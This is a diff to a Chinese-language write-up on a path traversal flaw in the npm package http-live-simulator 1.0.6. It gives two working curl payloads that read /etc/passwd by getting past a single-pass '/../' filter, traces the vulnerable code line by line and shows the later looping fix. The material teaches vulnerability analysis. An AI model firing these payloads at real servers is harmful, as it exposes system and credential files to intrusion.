@@ -14,41 +14,63 @@
 |Windows|`<drive letter>:\`|`\` or `/`|
 
 
-### 实例1
+### 实例1 - 单次替换
 
-http-live-simulator@1.0.6 中开发人员没有考虑到路径穿越问题
+代码仓库
+[http-live-simulator@1.0.6](https://github.com/prahladyeri/http-live-simulator/tree/8e85a1be562248d0d616c0e5092a3d71bbf5fe5f)
 
-漏洞复现
+环境搭建
 ```
-# 1- Install the module : 
+# macOS 10.14.4
+cd /Users/xxx/Downloads
+
+# Install the module
 npm install -g http-live-simulator@1.0.6
-# 2- Run the server : 
+
+# Run the server
 http-live
-# 3- Attempt to access a file from outside that project's directory
-# 可实现任意文件读取.  其中curl的参数--path-as-is 表示"Do not squash .. sequences in URL path" 不压缩url路径中的..
-# 注意 紧跟8080之后额外加了一个/
+```
+
+漏洞利用
+```
+# Attempt to access a file from outside that project's directory
+# 其中curl的参数--path-as-is 表示"Do not squash .. sequences in URL path" 不压缩url路径中的..
+
+# 构造payload如下 都成功了
+
+# 绕过方式1  将 `/../` 替换为 `//../../`
 curl --path-as-is http://localhost:8080//../../../../etc/passwd
-```
+# 最终绝对路径为/Users/xxx/Downloads/../../../etc/passwd
+# cat自测 可成功读文件
 
-第1次修复 是将参数值中的`/../`替换为空 仅替换一次(修复无效 可被绕过)
-```
-pathname = pathname.replace("/../",""); //fix for path traversal bug
-```
-
-绕过方式 `/./.././`
-```
+# 绕过方式2  将 `/../` 替换为 `/./.././`
 curl --path-as-is http://localhost:8080/./../././../././../././.././etc/passwd
+# 最终绝对路径为/Users/xxx/Downloads/.././../././../././.././etc/passwd
+# cat自测 可成功读文件
+```
+
+分析绕过方式1 根据bin/http-live跟下后端逻辑
+```
+# 最开始接到pathname的参数值 //../../../../etc/passwd
+# 72行 pathname = pathname.replace("/../","");
+# 将参数值中的`/../` 替换为空 仅替换一次(修复无效 可被绕过).
+# 此时 pathname参数值变为 /../../../etc/passwd
+# 90行 拼接得到绝对路径 abspath = process.cwd() + pathname; #注意 process.cwd()得到当前目录 如/Users/xxx/Downloads  最后没有斜杠符号
+# (所以构造payload的url中8000后面必须有两个连续的/才对 否则路径构造错误 文件不存在 跳出 返回404)
+# 92行 此时绝对路径abspath值为 /Users/xxx/Downloads/../../../etc/passwd
+# 93行 if (fs.existsSync(abspath)) {  // 路径正确 文件存在	
+# 94行 fs.readFile(abspath, function(err, data) { // 将绝对路径实参 abspath 传入到fs.readFile函数
+# 98行 res.write(data); //将文件内容作为response body
+# 99行 res.end(); //返回响应
+# 实现了任意文件读取.
 ```
 
 
-第2次修复 是将参数值中的`/../`替换为空 循环替换 直到不存在`/../`为止
+可见1.0.7 的修复 diff: https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433
 
-diff: https://github.com/prahladyeri/http-live-simulator/commit/354644525f1626c5921abac10913c0d47f1f1433
+关键代码在`bin/http-live`中的72-74行 是将参数值中的`/../`替换为空 循环替换 直到不存在`/../`为止 如下
 ```
 while(pathname.indexOf("/../") != -1) {
 		pathname = pathname.replace("/../",""); //fix for path traversal bug
 	}
 ```
-
-
-
